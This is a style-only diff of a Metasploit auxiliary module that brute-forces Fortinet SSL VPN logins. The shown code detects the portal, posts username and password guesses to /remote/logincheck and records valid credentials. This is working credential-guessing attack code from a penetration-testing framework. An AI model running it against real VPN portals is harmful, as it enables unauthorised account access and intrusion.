@@ -9,42 +9,45 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Fortinet SSL VPN Bruteforce Login Utility',
-      'Description'    => %{
-        This module scans for Fortinet SSL VPN web login portals and
-        performs login brute force to identify valid credentials.
-      },
-      'Author'         => [ 'Max Michels <kontakt[at]maxmichels.de>' ],
-      'License'        => MSF_LICENSE,
-      'DefaultOptions' =>
-        {
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Fortinet SSL VPN Bruteforce Login Utility',
+        'Description' => %q{
+          This module scans for Fortinet SSL VPN web login portals and
+          performs login brute force to identify valid credentials.
+        },
+        'Author' => [ 'Max Michels <kontakt[at]maxmichels.de>' ],
+        'License' => MSF_LICENSE,
+        'DefaultOptions' => {
           'SSL' => true,
           'RPORT' => 443
         }
-    ))
+      )
+    )
 
     register_options(
       [
-        OptString.new('DOMAIN', [false, "Domain/Realm to use for each account", ''])
-      ])
+        OptString.new('DOMAIN', [false, 'Domain/Realm to use for each account', ''])
+      ]
+    )
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     unless check_conn?
-      vprint_error("Connection failed, Aborting...")
+      vprint_error('Connection failed, Aborting...')
       return false
     end
 
     unless is_app_ssl_vpn?
-      vprint_error("Application does not appear to be Fortinet SSL VPN. Module will not continue.")
+      vprint_error('Application does not appear to be Fortinet SSL VPN. Module will not continue.')
       return false
     end
 
-    vprint_good("Application appears to be Fortinet SSL VPN. Module will continue.")
+    vprint_good('Application appears to be Fortinet SSL VPN. Module will continue.')
 
-    vprint_status("Starting login brute force...")
+    vprint_status('Starting login brute force...')
     each_user_pass do |user, pass|
       do_login(user, pass)
     end
@@ -55,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       res = send_request_cgi('uri' => '/', 'method' => 'GET')
       if res
-        vprint_good("Server is responsive...")
+        vprint_good('Server is responsive...')
         return true
       end
     rescue ::Rex::ConnectionRefused,
@@ -120,24 +123,24 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       post_params = {
-        'ajax'  => '1',
+        'ajax' => '1',
         'username' => user,
         'credential' => pass
       }
 
-      #check to use domain/realm or not
+      # check to use domain/realm or not
       if datastore['DOMAIN'].nil? || datastore['DOMAIN'].empty?
-        post_params['realm'] = ""
+        post_params['realm'] = ''
       else
         post_params['realm'] = datastore['DOMAIN']
       end
 
       res = send_request_cgi(
-              'uri' => '/remote/logincheck',
-              'method' => 'POST',
-              'ctype' => 'application/x-www-form-urlencoded',
-              'vars_post' => post_params
-            )
+        'uri' => '/remote/logincheck',
+        'method' => 'POST',
+        'ctype' => 'application/x-www-form-urlencoded',
+        'vars_post' => post_params
+      )
 
       if res &&
          res.code == 200 &&
@@ -148,11 +151,11 @@ class MetasploitModule < Msf::Auxiliary
         if datastore['DOMAIN'].nil? || datastore['DOMAIN'].empty?
           print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
           report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)
-          report_note(ip: rhost, type: "fortinet.ssl.vpn",data: "User: #{user}")
+          report_note(ip: rhost, type: 'fortinet.ssl.vpn', data: "User: #{user}")
         else
-          print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}:#{datastore["DOMAIN"]}")
+          print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}:#{datastore['DOMAIN']}")
           report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)
-          report_note(ip: rhost, type: "fortinet.ssl.vpn",data: "User: #{user} / Domain: #{datastore["DOMAIN"]}")
+          report_note(ip: rhost, type: 'fortinet.ssl.vpn', data: "User: #{user} / Domain: #{datastore['DOMAIN']}")
         end
 
         return :next_user
@@ -160,13 +163,12 @@ class MetasploitModule < Msf::Auxiliary
       else
         vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
       end
-
     rescue ::Rex::ConnectionRefused,
            ::Rex::HostUnreachable,
            ::Rex::ConnectionTimeout,
            ::Rex::ConnectionError,
            ::Errno::EPIPE
-      vprint_error("HTTP Connection Failed, Aborting")
+      vprint_error('HTTP Connection Failed, Aborting')
       return :abort
     end
   end
